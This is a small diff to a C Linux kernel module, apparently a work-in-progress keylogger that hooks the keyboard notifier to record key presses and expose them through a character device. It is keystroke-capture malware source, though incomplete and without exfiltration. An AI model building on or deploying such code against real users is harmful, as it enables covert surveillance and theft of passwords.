@@ -11,19 +11,18 @@ char const *chardev_name ="keylogger";
 static struct file_operations fops =
 {
     .owner = THIS_MODULE, 
-    .read = device_read/*,
-    .open = device_open, */
+    .read = device_read
 };
 
 /**/
 int notifier(struct notifier_block *block, unsigned long code, void *p)
 {
     struct keyboard_notifier_param *param;
-    char *tmp;
     param =p;
     /*needs to conect to the char dvice*/
     if (param->down){
         update_key(*param);
+        msg_Ptr=NULL;
     }
 
 }
